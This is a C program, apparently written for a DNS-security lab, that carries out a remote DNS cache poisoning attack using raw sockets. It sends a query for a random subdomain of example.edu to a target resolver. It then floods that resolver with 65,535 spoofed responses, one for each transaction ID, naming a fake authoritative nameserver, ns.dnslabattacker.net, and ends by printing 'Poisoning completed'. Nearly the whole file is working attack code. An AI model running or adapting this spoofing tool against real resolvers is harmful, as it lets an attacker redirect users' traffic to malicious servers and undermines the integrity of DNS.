/*
	Raw UDP sockets
*/
#include <stdio.h>       //for printf
#include <string.h>      //memset
#include <sys/socket.h>  //for socket
#include <stdlib.h>      //for exit(0);
#include <errno.h>       //For errno - the error number
#include <netinet/udp.h> //Provides declarations for udp header
#include <netinet/tcp.h> //Provides declarations for tcp header
#include <netinet/ip.h>  //Provides declarations for ip header
#include <arpa/inet.h>   // for inet_pton
#include <time.h>
#include <unistd.h> //for close socket
#include <sys/time.h>

#define PCKT_LEN 8192
#define FLAG_R 0x8400
#define FLAG_Q 0x0100

/* 
	96 bit (12 bytes) pseudo header needed for udp header checksum calculation 
*/
struct ipheader {

     unsigned char      iph_ihl:4, iph_ver:4;

     unsigned char      iph_tos;

     unsigned short int iph_len;

     unsigned short int iph_ident;


     unsigned short int iph_offset;

     unsigned char      iph_ttl;

     unsigned char      iph_protocol;

     unsigned short int iph_chksum;

     unsigned int       iph_sourceip;

     unsigned int       iph_destip;

    };


    struct udpheader {

     unsigned short int udph_srcport;

     unsigned short int udph_destport;

     unsigned short int udph_len;

     unsigned short int udph_chksum;

    };
    struct dnsheader {
	unsigned short int query_id;
	unsigned short int flags;
	unsigned short int QDCOUNT;
	unsigned short int ANCOUNT;
	unsigned short int NSCOUNT;
	unsigned short int ARCOUNT;
};
struct datalen{
    unsigned short int ttl1,ttl2;
    unsigned short int len;
};

    struct dataEnd{
	unsigned short int  type;
	unsigned short int  class;
};
struct len{
    int  len1;
    int  len2;

};

uint16_t check_udp_sum(uint8_t *buffer, int len);
unsigned int checksum(uint16_t *usBuff, int isize);
unsigned short csum(unsigned short *buf, int nwords);
void four_Bits(char *data,char *data_send,struct len *lengths);

unsigned int checksum(uint16_t *usBuff, int isize)
{
	unsigned int cksum=0;
	for(;isize>1;isize-=2){
	cksum+=*usBuff++;
       }
	if(isize==1){
	 cksum+=*(uint16_t *)usBuff;
        }


	return (cksum);
}

uint16_t check_udp_sum(uint8_t *buffer, int len)
{
    unsigned long sum=0;
	struct ipheader *tempI=(struct ipheader *)(buffer);
	struct udpheader *tempH=(struct udpheader *)(buffer+sizeof(struct ipheader));
	struct dnsheader *tempD=(struct dnsheader *)(buffer+sizeof(struct ipheader)+sizeof(struct udpheader));
	tempH->udph_chksum=0;
	sum=checksum( (uint16_t *)   &(tempI->iph_sourceip) ,8 );
	sum+=checksum((uint16_t *) tempH,len);

	sum+=ntohs(IPPROTO_UDP+len);
	

	sum=(sum>>16)+(sum & 0x0000ffff);
	sum+=(sum>>16);

	return (uint16_t)(~sum);
	
}
    unsigned short csum(unsigned short *buf, int nwords)

    {       //

            unsigned long sum;

            for(sum=0; nwords>0; nwords--)

                    sum += *buf++;

            sum = (sum >> 16) + (sum &0xffff);

            sum += (sum >> 16);

            return (unsigned short)(~sum);

    }


//A Proggram i found only that changes the first 4bit of the query
void four_Bits(char *data,char *data_send,struct len *lengths){

        
    
    strcpy(data,"\5aaaaa\7example\3edu");
    int length_send= strlen(data)+1;
    struct dataEnd * end_send=(struct dataEnd *)(data_send+length_send);
    end_send->type=htons(1);
    end_send->class=htons(1);

 strcpy(data,"\5aaaaa\7example\3edu");
     int length= strlen(data)+1;
    

 struct dataEnd * end=(struct dataEnd *)(data+length);
    end->type=htons(1);
    end->class=htons(1);
    length+=4;
    strcpy(data+length,"\xc0\x0c");
    length+=2;
    struct dataEnd * end1=(struct dataEnd *)(data+length);
    end1->type=htons(1);
    end1->class=htons(1);
    length+=4;
        
   
    struct datalen * len1=(struct datalen *)(data+length);
    len1->ttl1=htons(1);
    len1->ttl2=htons(1);
    len1->len=htons(4);
    length+=6;
        strcpy(data+length,"\1\1\1\1");
    length+=4;
        strcpy(data+length,"\xc0\x12");
    length+=2;
        struct dataEnd * end2=(struct dataEnd *)(data+length);
    end2->type=htons(2);
    end2->class=htons(1);
    length+=4;
        
    struct datalen * len2=(struct datalen *)(data+length);
    len2->ttl1=htons(1);
    len2->ttl2=htons(1);
    len2->len=htons(23);
    length+=6;
    //fake name server
    // ns.dnslabattacker.net
    strcpy(data+length,"\2ns\16dnslabattacker\3net");
    length+=23;
    //addition 
    strcpy(data+length,"\2ns\16dnslabattacker\3net");
    length+=23;
    struct dataEnd * end3=(struct dataEnd *)(data+length);
    end3->type=htons(1);
    end3->class=htons(1);
    length+=4;
    struct datalen * len3=(struct datalen *)(data+length);
    len3->ttl1=htons(1);
    len3->ttl2=htons(1);
    len3->len=htons(4);
    length+=6;
    strcpy(data+length,"\1\1\1\1");    length+=5;
    struct dataEnd * end4=(struct dataEnd *)(data+length);
    end4->type=htons(41);
    end4->class=htons(4096);
    length+=6;
    struct dataEnd * end5=(struct dataEnd *)(data+length);
    end5->type=htons(34816);
    end5->class=htons(0);
    
    

lengths->len1=length;

lengths->len2=length_send;

}






int main(int argc, char *argv[])
{   

    if(argc != 3){
    	printf("- Invalid parameters!!!\nPlease enter 2 ip addresses\nFrom first to last:src_IP  dest_IP  \n");
    	exit(-1);
    }
    
    
    int sd;
// buffer to hold the packet
    char buffer[PCKT_LEN];
    char send_buf[PCKT_LEN];
// set the buffer to 0 for all bytes
    memset(buffer, 0, PCKT_LEN);
    memset(send_buf, 0, PCKT_LEN);
  
    struct ipheader *ip = (struct ipheader *) buffer;
    struct udpheader *udp = (struct udpheader *) (buffer + sizeof(struct ipheader));
    struct dnsheader *dns=(struct dnsheader*) (buffer +sizeof(struct ipheader)+sizeof(struct udpheader));
    struct ipheader *ip2 = (struct ipheader *) send_buf;
    struct udpheader *udp2 = (struct udpheader *) (send_buf + sizeof(struct ipheader));
    struct dnsheader *dns2=(struct dnsheader*) (send_buf +sizeof(struct ipheader)+sizeof(struct udpheader));
    char *data=(buffer +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader));
    char *data_send=(send_buf +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader));
	
    struct len *lengths=malloc(sizeof(struct len));
    lengths->len1=0;
    lengths->len2=0;
    int length,length_send=0; 
    
    dns2->flags=htons(FLAG_Q);
	dns2->QDCOUNT=htons(1);
    dns->flags=htons(FLAG_R);
	dns->QDCOUNT=htons(1);
    dns->ANCOUNT=htons(1);
    dns->NSCOUNT=htons(1);
    dns->ARCOUNT=htons(2);     
    four_Bits(data,data_send,lengths);   
    length=lengths->len1;
    length_send=lengths->len2;
    struct sockaddr_in sin, din;
    int one = 1;
    const int *val = &one;
    dns->query_id=rand(); // transaction ID for the query packet, use random #
    dns2->query_id=rand();
   // Create a raw socket with UDP protocol

    sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
if(sd<0 ){ // if socket fails to be created 
    printf("socket error\n");
}
    
    sin.sin_family = AF_INET;
    din.sin_family = AF_INET;
    // Port numbers
    sin.sin_port = htons(33333);
    din.sin_port = htons(53);
    sin.sin_addr.s_addr = inet_addr(argv[2]); // this is the second argument we input into the program
    din.sin_addr.s_addr = inet_addr(argv[1]); // this is the first argument we input into the program
    ip->iph_ihl = 5;
    ip->iph_ver = 4;
    ip->iph_tos = 0; // Low delay
    unsigned short int packetLength =(sizeof(struct ipheader) + sizeof(struct udpheader)+sizeof(struct dnsheader)+length+sizeof(struct dataEnd)); // length + dataEnd_size == UDP_payload_size
    ip->iph_len=htons(packetLength);
    ip->iph_ident = htons(rand()); // we give a random number for the identification#
    ip->iph_ttl = 110; // hops
    ip->iph_protocol = 17; // UDP
    
    ip->iph_sourceip = inet_addr("199.77.123.53");
    ip->iph_destip = inet_addr(argv[2]);
    udp->udph_srcport = htons(53);//40000+rand()%10000);  // source port number, I make them random... remember the lower number may be reserved
    udp->udph_destport = htons(33333);
    udp->udph_len = htons(sizeof(struct udpheader)+sizeof(struct dnsheader)+length+sizeof(struct dataEnd)); // udp_header_size + udp_payload_size
    ip->iph_chksum = csum((unsigned short *)buffer, sizeof(struct ipheader) + sizeof(struct udpheader));
    udp->udph_chksum=check_udp_sum(buffer, packetLength-sizeof(struct ipheader));



    ip2->iph_ihl = 5;
    ip2->iph_ver = 4;
    ip2->iph_tos = 0; // Low delay
    unsigned short int packetLength_send =(sizeof(struct ipheader) + sizeof(struct udpheader)+sizeof(struct dnsheader)+length_send+sizeof(struct dataEnd)); // length + dataEnd_size == UDP_payload_size
    ip2->iph_len=htons(packetLength_send);
    ip2->iph_ident = htons(rand()); // we give a random number for the identification#
    ip2->iph_ttl = 110; // hops
    ip2->iph_protocol = 17; // UDP
    ip2->iph_sourceip = inet_addr(argv[1]);
    ip2->iph_destip = inet_addr(argv[2]);
    udp2->udph_srcport = htons(40000+rand()%10000);  // source port number, I make them random... remember the lower number may be reserved
    udp2->udph_destport = htons(53);
    udp2->udph_len = htons(sizeof(struct udpheader)+sizeof(struct dnsheader)+length_send+sizeof(struct dataEnd)); // udp_header_size + udp_payload_size
    ip2->iph_chksum = csum((unsigned short *)buffer, sizeof(struct ipheader) + sizeof(struct udpheader));
    udp2->udph_chksum=check_udp_sum(buffer, packetLength_send-sizeof(struct ipheader));
    const int optVal = 1;
        if( setsockopt( sd , IPPROTO_IP , IP_HDRINCL , &optVal , sizeof( optVal ) ) < 0 )
    {
        printf("[-]Error to setsockopt to the socket.\n");

        return 1;
    }

    
       
   
       
        
        

      int charnumber;
	charnumber=1+rand()%5;
    *(data_send+charnumber)+=1;
	*(data+charnumber)+=1;
    //send request:
    udp2->udph_chksum=check_udp_sum(send_buf, packetLength_send-sizeof(struct ipheader)); // recalculate the checksum for the UDP packet

        // send the packet out.
        if(sendto(sd, send_buf, packetLength_send, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
        printf("packet send error %d which means %s\n",errno,strerror(errno));
    //Send fake response
    unsigned short int co=65535;
    unsigned short int packet_num =0;
    
    while(co>0){
        dns->query_id=co; // transaction ID for the query packet, use random #
        udp->udph_chksum=check_udp_sum(buffer, packetLength-sizeof(struct ipheader)); // recalculate the checksum for the UDP packet
         co--;
         packet_num++;
    // send the packet out.
        if(sendto(sd, buffer, packetLength, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
        printf("packet send error %d which means %s\n",errno,strerror(errno));
        if(packet_num%10000==0){
        printf("%d Packets were sent \n",packet_num);
        }
        if(packet_num==65535){
        printf("Poisoning completed\n");
       
        }

        }

      
    close(sd);
    return 0;

}